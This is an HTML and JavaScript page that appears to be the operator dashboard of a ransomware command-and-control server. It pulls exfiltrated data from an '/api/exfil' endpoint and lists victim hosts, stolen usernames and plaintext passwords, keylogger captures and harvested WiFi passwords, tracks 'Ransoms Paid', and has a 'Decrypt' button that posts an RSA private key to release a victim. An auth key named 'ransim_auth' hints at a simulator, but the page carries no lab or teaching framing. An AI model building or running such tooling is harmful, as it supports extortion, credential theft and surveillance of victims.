<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, sans-serif;
        }

        body {
            background-color: #f9f9fa;
            color: #111111;
            min-height: 100vh;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 40px 20px;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 40px;
        }

        .header h1 {
            font-size: 24px;
            font-weight: 600;
            letter-spacing: -0.5px;
        }

        .refresh-btn {
            background-color: #ffffff;
            color: #111111;
            border: 1px solid #e0e0e0;
            padding: 8px 16px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 13px;
            font-weight: 500;
            transition: all 0.2s;
        }

        .refresh-btn:hover {
            border-color: #111111;
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 16px;
            margin-bottom: 40px;
        }

        .stat-card {
            background: #ffffff;
            border: 1px solid #eaeaeb;
            border-radius: 8px;
            padding: 24px;
        }

        .stat-card h3 {
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 4px;
        }

        .stat-card p {
            color: #666666;
            font-size: 13px;
            font-weight: 500;
        }

        .content {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 24px;
        }

        @media (max-width: 900px) {
            .content { grid-template-columns: 1fr; }
        }

        .panel {
            background: #ffffff;
            border: 1px solid #eaeaeb;
            border-radius: 8px;
            overflow: hidden;
        }

        .panel-header {
            padding: 16px 20px;
            border-bottom: 1px solid #eaeaeb;
            font-size: 14px;
            font-weight: 600;
            background: #ffffff;
        }

        .panel-body {
            max-height: 400px;
            overflow-y: auto;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 13px;
        }

        th {
            text-align: left;
            padding: 12px 20px;
            color: #666666;
            font-weight: 500;
            border-bottom: 1px solid #eaeaeb;
            position: sticky;
            top: 0;
            background: #ffffff;
        }

        td {
            padding: 14px 20px;
            border-bottom: 1px solid #f0f0f0;
            color: #333333;
        }

        tr:last-child td { border-bottom: none; }
        tr:hover { background-color: #fafafa; }

        code {
            background: #f4f4f5;
            padding: 2px 6px;
            border-radius: 4px;
            font-family: monospace;
            font-size: 12px;
            color: #111111;
        }

        .badge {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: 500;
        }

        .badge-active { background: #e6f4ea; color: #137333; }
        .badge-paid { background: #fef7e0; color: #b06000; }

        .action-btn {
            background: transparent;
            color: #111111;
            border: 1px solid #e0e0e0;
            padding: 4px 12px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 12px;
            transition: all 0.2s;
        }

        .action-btn:hover {
            border-color: #111111;
            background: #fafafa;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="header">
            <div style="display: flex; align-items: center; gap: 12px;">
                <img src="/kaoskaki.webp" alt="Logo" style="height: 32px; border-radius: 4px;">
                <h1>Command Center</h1>
            </div>
            <button class="refresh-btn" onclick="loadData()">Refresh Data</button>
        </div>

        <div class="stats" id="stats">
            <div class="stat-card">
                <h3 id="totalSessions">0</h3>
                <p>Total Targets</p>
            </div>
            <div class="stat-card">
                <h3 id="activeSessions">0</h3>
                <p>Active (last 1h)</p>
            </div>
            <div class="stat-card">
                <h3 id="totalCreds">0</h3>
                <p>Credentials</p>
            </div>
            <div class="stat-card">
                <h3 id="totalKeylogs">0</h3>
                <p>Keylog Entries</p>
            </div>
            <div class="stat-card">
                <h3 id="totalWifi">0</h3>
                <p>WiFi Profiles</p>
            </div>
            <div class="stat-card">
                <h3 id="paidSessions">0</h3>
                <p>Ransoms Paid</p>
            </div>
        </div>

        <div class="content">
            <div class="panel">
                <div class="panel-header">Active Sessions</div>
                <div class="panel-body">
                    <table>
                        <thead>
                            <tr>
                                <th>Session ID</th>
                                <th>Target</th>
                                <th>IP</th>
                                <th>Status</th>
                                <th>Action</th>
                            </tr>
                        </thead>
                        <tbody id="sessionsBody"></tbody>
                    </table>
                </div>
            </div>

            <div class="panel">
                <div class="panel-header">Credentials</div>
                <div class="panel-body">
                    <table>
                        <thead>
                            <tr>
                                <th>Origin</th>
                                <th>Username</th>
                                <th>Password</th>
                            </tr>
                        </thead>
                        <tbody id="credsBody"></tbody>
                    </table>
                </div>
            </div>

            <div class="panel">
                <div class="panel-header">Keylogger</div>
                <div class="panel-body">
                    <table>
                        <thead>
                            <tr>
                                <th>Session</th>
                                <th>Content</th>
                                <th>Time</th>
                            </tr>
                        </thead>
                        <tbody id="keylogBody"></tbody>
                    </table>
                </div>
            </div>

            <div class="panel">
                <div class="panel-header">WiFi Profiles</div>
                <div class="panel-body">
                    <table>
                        <thead>
                            <tr>
                                <th>SSID</th>
                                <th>Password</th>
                                <th>Time</th>
                            </tr>
                        </thead>
                        <tbody id="wifiBody"></tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>

    <script>
        const auth = localStorage.getItem('ransim_auth');
        if (!auth) window.location.href = '/api/login';

        const API = '/api/exfil';

        function escapeHTML(str) {
            if (typeof str !== 'string') return String(str);
            return str.replace(/[&<>'"]/g, 
                tag => ({
                    '&': '&amp;',
                    '<': '&lt;',
                    '>': '&gt;',
                    "'": '&#39;',
                    '"': '&quot;'
                }[tag] || tag)
            );
        }

        async function loadData() {
            try {
                const btn = document.querySelector('.refresh-btn');
                btn.textContent = 'Loading...';

                const resp = await fetch(API + '?type=dashboard&_=' + Date.now());
                const data = await resp.json();

                document.getElementById('totalSessions').textContent = data.sessions?.length || 0;
                document.getElementById('totalCreds').textContent = data.credentials?.length || 0;
                document.getElementById('totalKeylogs').textContent = data.keylogs?.length || 0;
                document.getElementById('totalWifi').textContent = data.wifi?.length || 0;

                const oneHourAgo = Date.now() - 3600000;
                const active = (data.sessions || []).filter(s => {
                    const last = s.last_seen?._seconds ? s.last_seen._seconds * 1000 : 0;
                    return last > oneHourAgo;
                });
                document.getElementById('activeSessions').textContent = active.length;
                document.getElementById('paidSessions').textContent = (data.sessions || []).filter(s => s.is_paid).length;

                const sBody = document.getElementById('sessionsBody');
                sBody.innerHTML = (data.sessions || []).map(s => {
                    const status = s.is_paid ? '<span class="badge badge-paid">Paid</span>' : '<span class="badge badge-active">Active</span>';
                    return `<tr>
        <td><code>${escapeHTML(s.id?.substring(0, 8) || '?')}</code></td>
        <td>${escapeHTML(s.hostname || '?')}<br><span style="color:#888;font-size:11px">${escapeHTML(s.username || '?')}</span></td>
        <td>${escapeHTML(s.ip || '?')}</td>
        <td>${status}</td>
        <td><button onclick="markPaid('${escapeHTML(s.id || '')}')" class="action-btn">Decrypt</button></td>
      </tr>`;
                }).join('');

                const cBody = document.getElementById('credsBody');
                cBody.innerHTML = (data.credentials || []).map(c => {
                    const cred = c.data || {};
                    return `<tr>
        <td>${escapeHTML(cred.url || cred.origin || '?')}</td>
        <td>${escapeHTML(cred.username || cred.email || '?')}</td>
        <td><code>${escapeHTML(cred.password || '?')}</code></td>
      </tr>`;
                }).join('');

                const kBody = document.getElementById('keylogBody');
                kBody.innerHTML = (data.keylogs || []).map(k => {
                    const ts = k.timestamp?._seconds ? new Date(k.timestamp._seconds * 1000).toLocaleString() : '';
                    return `<tr>
        <td><code>${escapeHTML(k.session_id?.substring(0, 8) || '?')}</code></td>
        <td>${escapeHTML((k.data?.content || k.data || '').substring(0, 60))}...</td>
        <td><span style="color:#888;font-size:11px">${escapeHTML(ts)}</span></td>
      </tr>`;
                }).join('');

                const wBody = document.getElementById('wifiBody');
                wBody.innerHTML = (data.wifi || []).map(w => {
                    const ts = w.timestamp?._seconds ? new Date(w.timestamp._seconds * 1000).toLocaleString() : '';
                    const wifiData = w.data || {};
                    const ssid = Array.isArray(wifiData) ? wifiData.map(x => x.ssid).join(', ') : wifiData.ssid || '?';
                    const pass = Array.isArray(wifiData) ? wifiData.map(x => x.password).join(', ') : wifiData.password || '?';
                    return `<tr>
        <td>${escapeHTML(ssid)}</td>
        <td><code>${escapeHTML(pass)}</code></td>
        <td><span style="color:#888;font-size:11px">${escapeHTML(ts)}</span></td>
      </tr>`;
                }).join('');

                btn.textContent = 'Refresh Data';
            } catch (e) {
                console.error('Failed to load data:', e);
            }
        }

        async function markPaid(sessionId) {
            const privateKey = prompt('Enter RSA PRIVATE KEY:');
            if (!privateKey) return;

            try {
                const resp = await fetch(API, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ type: 'mark_paid', session_id: sessionId, private_key: privateKey })
                });
                const result = await resp.json();
                if (result.status === 'ok') {
                    alert('Session authorized.');
                    loadData();
                } else {
                    alert('Error: ' + (result.error || 'unknown'));
                }
            } catch (e) {
                alert('Connection Error: ' + e.message);
            }
        }

        loadData();
        setInterval(loadData, 15000);
    </script>
</body>
</html>
